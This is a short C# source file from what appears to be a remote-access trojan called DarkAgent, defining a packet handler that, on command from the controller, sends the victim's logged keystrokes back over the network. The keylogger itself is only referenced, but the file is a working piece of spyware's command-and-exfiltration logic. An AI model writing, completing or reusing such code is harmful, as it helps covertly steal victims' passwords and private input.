using System;
using System.Collections.Generic;
using System.Text;
using DarkAgent_Client.src.Network.DataNetwork.Packets.Send;
using DarkAgent_Client.src.Features;

namespace DarkAgent_Client.src.Network.DataNetwork.Packets.Receive
{
    class R_KeyStrokes : ReceiveBasePacket
    {
        public R_KeyStrokes(ClientConnect client, byte[] packet)
            : base(client, packet)
        {
        }

        public override void Read()
        {
        }

        public override void Run()
        {
            Client.SendPacket(new S_KeyStrokes(Client, Keylogger.KeyStrokes));
        }
    }
}
